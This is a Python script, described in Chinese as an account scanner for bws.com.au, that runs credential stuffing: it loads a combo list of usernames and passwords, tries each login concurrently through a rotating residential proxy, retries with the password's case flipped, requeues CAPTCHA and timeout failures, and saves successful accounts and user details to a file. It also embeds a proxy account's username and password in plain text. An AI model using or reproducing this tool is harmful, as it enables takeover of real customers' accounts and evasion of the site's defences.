# coding: utf-8
from utils.util import login, Counts
from functools import partial
from time import time
import asyncio
import argparse
import os
import sys

def convert_case(s: str)-> str:
    return s.capitalize() if s.islower() else s.lower()

def callback(start_time, users, tasks, task, sem, res):
    try:
        result = res.result()
        status = result.get('status', 'timeout')
        count._add(status)
        t = int(time() - start_time) or 1
        rate = int((count.complete / t) * 60)
        print(f'{count._iterstr()} <rate:{rate}/min>', end='\r', flush=True)
        if status in 'recaptcha timeout':
            userList.append(users)
        if status == 'success':
            userInfo= result.get('userInfo', '')
            with open(f'./result/success.{fileName}', 'a+', encoding='utf-8', errors='ignore') as F:
                F.writelines(f'{userInfo}\n')
    except Exception:
        pass
    task in tasks and tasks.remove(task)
    del task
    return sem.release()

async def trylogin(users: str, proxy: str, flag: str):
    try:
        user, pwd = users.split(flag)
        user, pwd = user.strip(), pwd.strip()
        res = await login(user, pwd, proxy)
        if not pwd[0].isalpha():
            return res
        if res.get('status', 'timeout') == 'error':
            pwd = convert_case(pwd)
            res = await login(user, pwd, proxy)
        return res
    except asyncio.CancelledError:
        pass

async def main(limit: int, flag: str, proxy: str):
    sem = asyncio.Semaphore(limit)
    tasks = []
    start_time = time()
    try:
        while count.complete < count.total:
            await sem.acquire()
            if not len(userList):
                await asyncio.sleep(1)
                continue
            users = userList.pop(0).strip()
            task = asyncio.create_task(trylogin(users, proxy, flag))
            task.add_done_callback(partial(callback, start_time, users, tasks, task, sem))
            tasks.append(task)
        if tasks:
            await asyncio.wait(tasks)
        print(u'\n任务完成')
    except asyncio.CancelledError:
        print(u'\n终止运行.')    
    except Exception:
        print(u'\n运行错误.')  
        
        
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description=u'-t 线程数量\n -f 账号分隔符(默认----) \n',
        prog=u'bws.com.au.v2 扫号',
        epilog=u'-h 显示帮助',
        add_help=True,
        conflict_handler='resolve'
    )
    parser.add_argument('-t', '--thread', dest='limit', type=int, default=1, help=u'线程数量')
    parser.add_argument('-f', '--flag', dest='flag', type=str, default='----', help=u'账号分隔符:(默认:----)')
    parser.add_argument('-p', '--proxy', dest='proxy', type=str,
                        default=r'chen1122-zone-resi-region-au:cc112233@445be58094ab9a4e.na.pyproxy.io:16666',
                        help=u'指定旋转代理:(user:pwd@host:port)')
    args = parser.parse_args()
    path = input('文件路径:').replace('"', '')
    index = input('开始位置:')
    try:
        index = int(index)
    except Exception:
        index = 0
    if not os.path.exists(path):
        sys.exit(0)
    fileName = os.path.basename(path)
    with open(path, 'r', encoding='utf-8', errors='ignore') as F:
        userList = F.readlines()
    if not len(userList):
        print(u'文件不能为空')
        sys.exit(0)
    parameter = dict(args._get_kwargs())
    if not os.path.isdir('result'):
        os.mkdir('result')
    length = len(userList[index:])
    count = Counts(complete=0, error=0, recaptcha=0, timeout=0, success=0, total=length)
    print(f'{count._iterstr()} <rate:0/min>', end='\r', flush=True)
    try:
        asyncio.run(main(**parameter))
    except KeyboardInterrupt:
        # all_tasks = asyncio.Task.all_tasks()
        sys.exit(1)
# /Users/lida/Desktop/cache/-_合并_去重复_去重复.txt